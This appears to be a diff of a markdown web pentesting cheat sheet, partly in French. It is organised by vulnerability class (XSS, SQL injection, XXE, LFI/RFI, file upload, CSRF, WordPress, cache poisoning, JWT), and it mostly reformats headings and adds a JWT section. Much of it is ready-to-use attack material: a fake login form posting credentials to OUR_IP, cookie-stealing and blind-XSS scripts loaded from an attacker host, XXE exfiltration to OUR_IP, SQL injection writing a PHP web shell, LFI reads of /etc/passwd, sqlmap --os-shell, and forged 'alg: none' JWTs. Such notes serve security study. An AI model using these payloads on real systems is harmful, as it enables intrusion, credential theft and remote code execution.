@@ -7,7 +7,7 @@ Pentest processing:
 
 ## *Top 0./ Web Reconnaissance*
 
-**Active Reconnaissance**   
+### ***Active Reconnaissance***   
 
 | Technique            | Tools                                      | Risk of Detection                              |
 |----------------------|--------------------------------------------|------------------------------------------------|
@@ -19,7 +19,7 @@ Pentest processing:
 | Service Enumeration   | Nmap                                       | Low: Similar to banner grabbing, service enumeration can be logged but is less likely to trigger alerts. |
 | Web Spidering         | Burp Suite Spider, OWASP ZAP Spider, Scrapy | Low to Medium: Can be detected if the crawler's behaviour is not carefully configured to mimic legitimate traffic. |
 
-**Passive Reconnaissance**  
+### ***Passive Reconnaissance***  
 
 | Technique             | Tools                                                  | Risk of Detection                                        |
 |-----------------------|--------------------------------------------------------|----------------------------------------------------------|
@@ -30,7 +30,7 @@ Pentest processing:
 | Social Media Analysis | LinkedIn, Twitter, Facebook, specialised OSINT tools  | Very Low: Accessing public social media profiles is not considered intrusive. |
 | Code Repositories     | GitHub, GitLab                                         | Very Low: Code repositories are meant for public access, and searching them is not suspicious. |
 
-**WHOIS**  
+#### ***WHOIS***  
 
 WHOIS is designed to access databases that store information about registered internet resources. WHOIS can also provide details about IP address blocks and autonomous systems.   
 He can be useful for `Phishing Investigation`, `Malware Analysis`, `Threat Intelligence Report`,...   
@@ -38,7 +38,7 @@ He can be useful for `Phishing Investigation`, `Malware Analysis`, `Threat Intel
 whois facebook.com
 ```
 
-**DIG**  
+#### ***DIG***  
 The dig command (Domain Information Groper) is a versatile and powerful utility for querying DNS servers and retrieving various types of DNS records.  
 Here some basics commands :  
 | Command                                | Description                                                            |
@@ -58,7 +58,7 @@ Here some basics commands :
 | `dig +noall +answer domain.com`        | Displays only the answer section of the query output.                  |
 | `dig domain.com ANY`                   | Retrieves all available DNS records for the domain.                    |
 
-**DNS Brut forcing**  
+### ***DNS Brut forcing***  
 You can brut force with ffuf and seclist but here some commands with DNSENUM:  
 ```bash
 dnsenum --enum inlanefreight.com -f  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
@@ -124,7 +124,7 @@ done
   ```bash
   HS256, HS384 and HS512
   ```
-  ## *Top 3./ Injection breach*
+## *Top 3./ Injection breach*
 Before starting to try some payload you need to understand how web application work.   
 You need to enumerate:
   - All users input
@@ -173,7 +173,7 @@ Main types of XSS :
 | Reflected (Non-Persistent) XSS                | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)                                               |
 | DOM-based XSS                  | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)  |
 
-**important payload**
+#### ***important payload***
 ```html
 document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
 <script>document.body.style.background = "#141d2b"</script>
@@ -186,7 +186,7 @@ document.getElementsByTagName('body')[0].innerHTML = "New Text"
 ```
 
 
-**XSS Discovery**  
+#### ***XSS Discovery***  
 you can use automated tools like XSS Strike, Brute XSS, XSSer.
 ```bash
 git clone https://github.com/s0md3v/XSStrike.git
@@ -201,13 +201,13 @@ or manual discover
 <script>debugger;</script>
 ```
 
-**Dom based XSS**
+#### ***Dom based XSS***
 ```html
 <img src="" onerror=alert(window.origin)>
 #"><img src=/ onerror=alert(2)>
 ```
 
-**Blind XSS**   
+#### ***Blind XSS***   
 A Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to  
 Detect blind XSS :
 ```html
@@ -220,7 +220,7 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP:
 ```
 Listen with netcat or php and see if you have a request.
 
-**Hijacking sessions**  
+#### ***Hijacking sessions***  
 Create a script.js and a index.php in new folder.  
 script.js :  
 ```javascript
@@ -247,7 +247,7 @@ XSS :
 <script src=http://OUR_IP:OUR_PORT/script.js></script>
 ```
 
-**Library XSS**  
+#### ***Library XSS***  
 static-eval sandbox : 
 [licenciaparahackear_static_eval_escape](https://licenciaparahackear.github.io/posts/static-eval-sandbox-escape-original-writeup/)
 ```javascript
@@ -264,7 +264,7 @@ Before starting here some links and images useful : [Advance Payload SQLI Github
 
 Each following payload is an example you need modify them before use.   
 
-**Payload detection**  
+#### ***Payload detection***  
 ```SQL
 ' OR 1=1 --
 ' OR 'a'='a' --
@@ -276,7 +276,7 @@ Each following payload is an example you need modify them before use.
 ;
 )
 ```
-**Union Based Payload**  
+#### ***Union Based Payload***  
 ```SQL
 ' UNION SELECT 1,2 --
 ' UNION SELECT 1,2,3 --
@@ -296,18 +296,18 @@ Each following payload is an example you need modify them before use.
 ' UNION SELECT 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
 ' UNION SELECT "",'<?php system($_GET[cmd]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
 ```
-**Boolean Based Payload**
+#### ***Boolean Based Payload***
 ```SQL
 ' UNION SELECT 1,2,3 where database() like 's%';--
 ' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
 ' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';--
 ' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%';--
 ```
-**Time Based**
+#### ***Time Based***
 ```SQL
 ' UNION SELECT SLEEP(5),2 where database() like 'u%';--
 ```
-**SQL MAP**  
+#### ***SQL MAP***  
 Its tool to automated SQLI  
 here some option useful:  
 
@@ -371,16 +371,16 @@ sqlmap http://94.237.52.110:37168/case8.php --data 'id=1&t0ken=9XinKaZ3X99lxoZyR
 sqlmap -u "http://www.example.com/?id=1" --os-shell
 ```
 
-  ## *Top 4 non-secure application*
-  ## *Top 5 security misconfiguration*
-  ### **XEE (XML External Entity), XEE**
-  here site with more precision : [hacktricks_XEE](https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html?search=eval())  
+## *Top 4 non-secure application*
+## *Top 5 security misconfiguration*
+### **XEE (XML External Entity), XEE**
+here site with more precision : [hacktricks_XEE](https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html?search=eval())  
 Vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing.   
 To identify XEE finding web pages that accept an XML or JSON user input with Burp   
 
 **Note**: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.
 
-**Detection of XEE :**
+### ***Detection of XEE :***
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [<!ENTITY xee "3"> ]>
@@ -390,7 +390,7 @@ To identify XEE finding web pages that accept an XML or JSON user input with Bur
 </stockCheck>
 ```
 
-**Basic Payloads:**
+### ***Basic Payloads:***
 ```xml
 <!ENTITY xxe SYSTEM "http://localhost/email.dtd">
 <!DOCTYPE foo [<!ENTITY xee SYSTEM "/etc/passwd"> ]>
@@ -398,7 +398,7 @@ To identify XEE finding web pages that accept an XML or JSON user input with Bur
 <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
 <!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
 ```
-**ByPass with CDATA:**
+### ***ByPass with CDATA:***
 ```xml
 <!DOCTYPE email [
   <!ENTITY begin "<![CDATA[">
@@ -408,8 +408,8 @@ To identify XEE finding web pages that accept an XML or JSON user input with Bur
 ]>
 ```
 
-  ## *Top 6 composant vulnerability*
-  ## *Top 7 authentification failure*
+## *Top 6 composant vulnerability*
+## *Top 7 authentification failure*
   Part of web application where authentification can be attack. (ex: login forms)  
   
   ![Capture d'écran de mon projet](auth_vs_auth.png)  
@@ -417,7 +417,7 @@ To identify XEE finding web pages that accept an XML or JSON user input with Bur
 Sometimes you can bypass by transforming `HTTP/1.1 302 FOUND` response request > `HTTP/1.1 200 OK`  
 Or remove value in Location request response  
 
- ### **Basic BrutForce**  
+ ### ***Basic BrutForce***  
   You can brutforce user, password, 2FA, session token, Cookies and see what the server return in the error message.  
   ```bash
   ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u http://example.com/login.php -X POST -H 'Content-type: application/w-xxx-form-urlencoded' -d 'username=FUZZ&password=invalid' -fr 'Invalid user'
@@ -427,10 +427,10 @@ Or remove value in Location request response
   ```
  
 
-  Test default credential : [CIRT.net](https://www.cirt.net/passwords)
+Test default credential : [CIRT.net](https://www.cirt.net/passwords)
   
-  ## *Top 8 failure integrity data* 
-  Website unintentionally reveals sensitive information, example:
+## *Top 8 failure integrity data* 
+Website unintentionally reveals sensitive information, example:
   - Revealing the names of hidden directories, their structure, and their contents via a robots.txt file or directory listing
   - Providing access to source code files via temporary backups
   - Explicitly mentioning database table or column names in error messages
@@ -439,7 +439,7 @@ Or remove value in Location request response
   - Hinting at the existence or absence of resources, usernames, and so on via subtle differences in application behavior
 
 
-  **Common sources of inforrmation discolsure:**
+### ***Common sources of inforrmation discolsure:***
   - Files for web crawlers
   - Directory listings
   - Developer comments
@@ -450,11 +450,9 @@ Or remove value in Location request response
   - Insecure configuration LABS
   - Version control history 
   
-
-  
-  ## *Top 9 journalisation defect*
-  ## *Top 10./ SSRF (Server-Side Request Forgery), SSTI (Server-Side Template Injection), SSI (Server-Side Includes)*
-  **A chercher dans des boutons qui affichent directement un retour sans charger la page ou quand le site pense faire une requete vers une autre site**
+## *Top 9 journalisation defect*
+## *Top 10./ SSRF (Server-Side Request Forgery), SSTI (Server-Side Template Injection), SSI (Server-Side Includes)*  
+**A chercher dans des boutons qui affichent directement un retour sans charger la page ou quand le site pense faire une requete vers une autre site**
 ### **SSRF**
 Permet sur une application web (API) de faire une requete avec le server. (like preview button)
 Une fois la faille SSRF découverte on peut tester de faire des requetes GEt ou POST comme :
@@ -488,7 +486,7 @@ SSTI avec TWIG si {{7*'7'}}=49:
 {{['id'] | filter('system')}}
 ```
 ## *Top 11./ LFI (Local File Inclusion) and RFI (Remote File Inclusion)*
-### **A chercher un peu partout dans les parametres GET et POST**
+### ***A chercher un peu partout dans les parametres GET et POST***
 Test de payload pour la découverte d'une LFI:  
 ```bash
 ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -u http://example.com/index.php?language=FUZZ
@@ -504,13 +502,13 @@ Classic Bypass LFI:
 #url encode sur burpsuite
 ./language/../../../
 ```
-### **PHP filter**    
+### ***PHP filter***    
 ```bash
 http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../etc/passwd
 http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id #echo '<?php system($_GET["cmd"]); ?>' | base64 = PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
 curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
 ```
-### **RFI**  
+### ***RFI***  
 Remote file inclusion, allows the inclusion of remote URLs  
 You can enumerate local port like SSRF:   
 ```url
@@ -532,11 +530,11 @@ Link:
 [File signatures/Magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)  
 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)   
 
-### **ByPass Client validation**  
+### ***ByPass Client validation***  
 Upload a real image and modified request in Burp with payload and file name (image.png > shell.php)  
 Or just delete html code who calls the sanytasing function.   
 
-### **Bypass Whithlist and Blacklist**   
+### ***Bypass Whithlist and Blacklist***   
 You need to test wich .extension backend accept   
 You can add prefix and suffix in Burp Intruder (ex: png.phar, php7.png, php.jpeg, ...) 
 ```bash
@@ -563,10 +561,10 @@ You can add prefix and suffix in Burp Intruder (ex: png.phar, php7.png, php.jpeg
 .php\x00.jpg
 ```
 
-### **Bypass Magic Bytes**
+### ***Bypass Magic Bytes***
 Just add BytesFile (ex: GIF8) before your payload to trick the back end server its a gif or png. 
 
-### **Payload**  
+### ***Payload***  
 - if server web use PHP
 ```php
 <?php system($_REQUEST['cmd']; ?>
@@ -608,7 +606,7 @@ If you have an SQLI you can search a table with sessid
 Possible if you have all the parameters required for the targeted request, and the application's session management is solely based on HTTP cookies, which are automatically included in browser requests.  
 Create a maliciouse request HTML and send it at the victim who is already logged into the application web.  
 
-**Payload exemple**  
+#### ***Payload exemple***  
 Before host webpage
 ```bash
 python3 -m http.server 8000
@@ -687,7 +685,7 @@ function handleResponse(d) {
 };
 </script>
 ```
-**Bypasse CSRF**  
+#### ***Bypasse CSRF***  
 Setting the CSRF token value to the same length as the original CSRF token but with a different/random value may also bypass  
 You can try making the CSRF token a null value (empty)  
 Another anti-CSRF protection bypass is using the same CSRF token across accounts  
@@ -703,7 +701,7 @@ Can find version of wordpress, wp plugins,  in index.html source code:
 - `<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3'></script>`  
 - `<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3' type='text/css' media='all' />`
 
-**Enumerate plugins and themes:**  
+### ***Enumerate plugins and themes:***  
 ```bash
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wp-plugins.FUZZ.txt -u http://example.com/FUZZ
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/CMS/wp-themes.FUZZ.txt -u http://example.com/FUZZ
@@ -716,7 +714,7 @@ plugins vulnerabilities
 wpscan --url http://example.com/ -enumerate ap --api-token <key>
 wpscan --url http://blog.inlanefreight.local -e ap --no-banner --plugins-detection aggressive --plugins-version-detection aggressive --max-threads 60 --api-token <key> #can take some times
 ```
-**Username listing and password brutforce:**  
+### ***Username listing and password brutforce:***  
 ```
 http://example.com/?author=1   # 1=admin 2=???
 wpscan --url http://example.com/ -enumerate u1-1000 --api-token <key>
@@ -727,7 +725,7 @@ wpscan --password-attack xmlrpc -U <user> -P /usr/share/wordlists/rockyou.txt --
 ```
 and go to wp-login.php with result  
 
-**RCE**  
+### ***RCE***  
 you need to have acces to wp-admin.  
 - go "Apparence", and "Themes Editor"
 - select "Themes to edit" ex: "twenty seventeen" and "select"
@@ -740,11 +738,11 @@ Poisoning the cache server so that HTTP response serv to other user. Exploiting 
 Here the way to exploit web cache poisoning:  
 ![](Web_cache_process.png)
 
-**Find unkeyed input**  
+### ***Find unkeyed input***  
 Use extention ParaMiner in burp, send request in ParaMiner.   
 Wait and look at Extension > Paraminer > Output.
 
-**Basic Example cache studie with unkeyed header**
+### ***Basic Example cache studie with unkeyed header***
 ```
 GET /en?dontpoisoneveryone=1 HTTP/1.1
 Host: www.redhat.com
@@ -756,17 +754,67 @@ Cache-Control: public, no-cache
 <meta property="og:image" content="https://a."><script>alert(1)</script>"/> 
 ```
 
-**Unkeyed cookie**
+### ***Unkeyed cookie***
 ```
 GET / HTTP/1.1
 Host: vulnerable.com
 Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
 ```
 
-**Multiple header**
+### ***Multiple header***
 ```
 GET /resources/js/tracking.js HTTP/1.1
 Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
 X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
 X-Forwarded-Scheme: http
+```
+
+## *Top 16./ JWT (Json Web Token)*   
+links useful: [JWT.io](https://jwt.io/), [JWT portswigger](https://portswigger.net/web-security/jwt)
+Its look like this:
+```
+eyJraWQiOiI1YzJiYTk3MC04MjU3LTQyN2EtYThiNC03OWE3Yjg3ZjZlNmYiLCJhbGciOiJIUzI1NiJ9.
+eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczOTQ0NTg5MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
+K575Ejv2_6tGj5QyGQCqIMm9bHaWM5hUkTugl3fG_p8
+```
+Decomposition :  
+Header `eyJraWQiOiI1YzJiYTk3MC04MjU3LTQyN2EtYThiNC03OWE3Yjg3ZjZlNmYiLCJhbGciOiJIUzI1NiJ9.` 
+```
+{
+  "kid": "5c2ba970-8257-427a-a8b4-79a7b87f6e6f",
+  "alg": "HS256"
+}
+```
+Payload `eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczOTQ0NTg5MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.`  
+```
+{
+  "iss": "portswigger",
+  "exp": 1739445891,
+  "sub": "administrator"
+}
+```
+And signature `K575Ejv2_6tGj5QyGQCqIMm9bHaWM5hUkTugl3fG_p8`   
+As the signature is directly derived from the rest of the token, changing a single byte of the header or payload results in a mismatched signature.
+Without knowing the server's secret signing key, it shouldn't be possible to generate the correct signature for a given header or payload.
+
+### ***flawed/Unverified signature verification***   
+Someties signature is not verified you can just change the username and encode your JWT Payload in Base64.  
+  
+You can skip hashing signature:  
+```
+{
+  "kid": "5c2ba970-8257-427a-a8b4-79a7b87f6e6f",
+  "alg": "none"
+}  
+```
+and supp signature of JWT like this `eyJraWQiOiI1YzJiYTk3MC04MjU3LTQyN2EtYThiNC03OWE3Yjg3ZjZlNmYiLCJhbGciOiJub25lIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczOTQ0NTg5MSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.`  
+   
+### ***JSON WEB TOKEN Burpsuite***   
+add JSON WEB TOKEN in extension Burp, and a new windows appear when you have a request with JWT.  
+Its useful for modify directly in Burp.
+   
+### ***Brute force easy signing key***  
+Here the default list key : [jwt.secrets.list](https://raw.githubusercontent.com/wallarm/jwt-secrets/refs/heads/master/jwt.secrets.list)  
+```bash
+hashcat -a 0 -m 16500 eyJraWQiOiJiZjU1M2JmYi0zYWEzLTQ5NjUtYmNmMy0wYmE4MWVjYjg1NzciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczOTQ0NDM2Nywic3ViIjoid2llbmVyIn0.w1Tb6lx5DUvYB8e8nYV0CXzU3xc5JFLo2zVCEsEd9IM jwt.secrets.list
 ```
